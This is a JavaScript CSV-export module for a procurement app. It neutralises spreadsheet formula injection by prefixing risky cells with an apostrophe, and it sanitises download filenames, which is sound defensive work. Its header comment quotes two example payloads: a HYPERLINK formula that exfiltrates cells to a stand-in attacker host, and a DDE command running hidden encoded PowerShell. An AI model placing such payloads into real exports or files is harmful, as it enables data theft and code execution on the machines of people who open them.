/**
 * csv.js — the CSV writer for every export in the app.
 *
 * WHY THIS EXISTS
 * ---------------
 * Every export route built its own line with the same expression, copied by
 * hand from the one before it:
 *
 *     .map(v => `"${String(v).replace(/"/g, '""')}"`).join(',')
 *
 * That solves the QUOTING problem — a comma or a double-quote inside a value no
 * longer breaks the column layout — and it solves nothing else. In particular
 * it does not address the other thing a spreadsheet can decide a cell is, which
 * is a FORMULA.
 *
 * THE FORMULA-INJECTION PROBLEM
 * -----------------------------
 * When Excel, LibreOffice Calc or Google Sheets opens a .csv, a cell whose text
 * begins with `=`, `+`, `-`, `@`, a TAB or a CR is evaluated rather than
 * displayed. Quoting does not prevent this: the parser strips the quotes first,
 * then evaluates what is left. So any user-controlled value that reaches an
 * export becomes executable content on the machine of whoever opens the file —
 * typically a finance or procurement analyst, on a desktop inside the network:
 *
 *     =HYPERLINK("https://evil.example/?d="&A1&A2,"Open report")
 *       ...exfiltrates neighbouring cells the moment the analyst clicks it.
 *     =cmd|'/c powershell -w hidden -enc <payload>'!A1
 *       ...the legacy DDE path; still executes in Excel where DDE is enabled.
 *
 * Every export in this app carries such a field. `pr.notes` (typed by whoever
 * raised a requisition), `vendor_name` (supplied through the PUBLIC supplier
 * self-registration portal, so unauthenticated), ticket subjects, account and
 * party names, employee and department names, NCR descriptions. All are free
 * text written by someone other than the person opening the file, which is the
 * whole precondition for this attack.
 *
 * Two exports were worse than unescaped — `accounting.routes.js` (trial balance)
 * and `extended.routes.js` (the BANK PAYMENT FILE) interpolated values straight
 * into a quoted string with no escaping at all, so a party name containing a
 * comma or a quote did not merely inject, it shifted every column after it.
 *
 * THE FIX, AND WHY IT IS SHAPED THIS WAY
 * --------------------------------------
 * A leading apostrophe tells every spreadsheet "this cell is text" and is not
 * itself displayed. Prefixing is chosen over stripping the character because
 * the export is a record: a requisition note that genuinely begins with a minus
 * sign should still read the same to a human.
 *
 * The one exception is a plain number. `-4500` must stay the number -4500, not
 * become the text '-4500, or every negative amount in a spend extract stops
 * summing. So a value that is entirely a number is passed through, and anything
 * else that starts with a formula lead is neutralised. Note that this correctly
 * catches `+919876543210`: a phone number is text, and treating it as one stops
 * the spreadsheet rendering it as 919876543210.
 *
 * USAGE
 *     import { toCsv, toCsvObjects, sendCsv } from '../../../shared/csv.js';
 *
 *     // array-shaped rows, with a literal or array header
 *     sendCsv(res, 'purchase-requests', toCsv(HEADER, rows.map(r => [ ... ])));
 *
 *     // object-shaped rows — replaces the local toCSV(rows) eight modules grew
 *     res.send(toCsvObjects(rows, { minimal: true }));
 *
 * Pass `{ minimal: true }` when replacing a helper that quoted conditionally, so
 * the conversion changes the security property and not the bytes.
 */

/** Characters a spreadsheet reads as "this cell is an expression". */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** Entirely a number — the one thing that must NOT be quoted into text. */
const PLAIN_NUMBER = /^-?(?:\d+(?:\.\d+)?|\.\d+)$/;

/** Characters that oblige a cell to be quoted. */
const MUST_QUOTE = /[",\r\n]/;

/**
 * One CSV cell: formula-neutralised, quote-escaped.
 *
 * QUOTING MODE. `minimal: true` quotes only cells that contain a delimiter, a
 * quote or a newline; the default quotes every cell. This exists so that
 * converting an existing export to this writer changes its SECURITY property
 * and nothing else — a route whose hand-rolled helper quoted conditionally
 * keeps emitting the same bytes for well-formed data, which matters most for
 * the files a bank or a statutory portal parses rather than a human.
 */
export function csvCell(val, { minimal = false } = {}) {
  if (val === null || val === undefined) return minimal ? '' : '""';
  let s = String(val);
  if (FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
  if (minimal && !MUST_QUOTE.test(s)) return s;
  return `"${s.replace(/"/g, '""')}"`;
}

/** One CSV record from an array of values. */
export const csvRow = (values, opts) => values.map(v => csvCell(v, opts)).join(',');

/**
 * A complete CSV document from array-shaped records.
 *
 * `header` may be an array of column names (escaped like any other row) or a
 * ready-made literal string, which is how most of these routes declare theirs.
 * Records are joined with CRLF per RFC 4180; every spreadsheet and parser in
 * use accepts it, and it is what Excel writes itself.
 *
 * A row that is already a string is passed through untouched — a few exports
 * carry a blank spacer line or a pre-formatted title row.
 */
export function toCsv(header, rows, opts) {
  const head = Array.isArray(header) ? csvRow(header, opts) : String(header ?? '');
  return [head, ...rows.map(row => (Array.isArray(row) ? csvRow(row, opts) : String(row)))].join('\r\n');
}

/**
 * A complete CSV document from OBJECT-shaped records — the shape eight modules
 * each grew their own local `toCSV(rows)` for.
 *
 * Columns default to the keys of the first row, which is what every one of
 * those local helpers did. Pass `columns` to fix the order, to include a column
 * the first row happens to be missing, or to emit a subset.
 */
export function toCsvObjects(rows, { columns = null, header = true, ...opts } = {}) {
  const list = Array.isArray(rows) ? rows : [];
  const cols = columns ?? (list.length ? Object.keys(list[0]) : []);
  const body = list.map(r => csvRow(cols.map(c => r?.[c]), opts));
  return header ? [csvRow(cols, opts), ...body].join('\r\n') : body.join('\r\n');
}

/**
 * Send a CSV as a download.
 *
 * `name` is a stem — the timestamp and extension are added here so every export
 * in the app is named the same way. It is stripped to a safe character set
 * because it lands in a response header: a stem carrying a quote or a newline
 * would otherwise let a caller who influences it forge header lines.
 */
export function sendCsv(res, name, csv) {
  const stem = String(name || 'export').replace(/[^A-Za-z0-9._-]/g, '-').slice(0, 80);
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="${stem}-${Date.now()}.csv"`);
  res.send(csv);
}

export default { csvCell, csvRow, toCsv, toCsvObjects, sendCsv };
